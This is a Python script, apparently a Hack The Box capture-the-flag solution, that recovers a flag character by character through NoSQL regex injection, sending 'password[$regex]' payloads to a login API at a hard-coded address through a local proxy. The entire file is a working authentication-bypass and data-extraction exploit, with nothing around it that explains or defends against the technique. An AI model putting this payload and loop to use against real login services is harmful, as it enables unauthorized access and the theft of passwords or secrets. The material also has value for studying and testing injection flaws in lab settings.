import requests
import string
proxies = {  "http": "127.0.0.1:8080",
  "https": "127.0.0.1:8080"}
flag = 'HTB{th3_4l13ns_h4'
test = string.ascii_letters + string.digits + string.punctuation
url = "http://94.237.51.150:48203/api/login"
restart = True  # Missing variable definition

while restart:
    for i in test:
        if i in ['?','*', '+', '.', '|', '(', ')', '[', ']', '^', '$', '-','\\']:
            continue
        data = {
            "username": "admin",
            "password[$regex]": "^" + flag + i
        }
        print("Trying:", flag + i)
        r = requests.post(url, data=data, allow_redirects=False,proxies=proxies)
        if "admin" in r.text:
            flag += i
            print(flag)
            if i == '}':
                restart = False
            break
print("Final Flag:", flag)
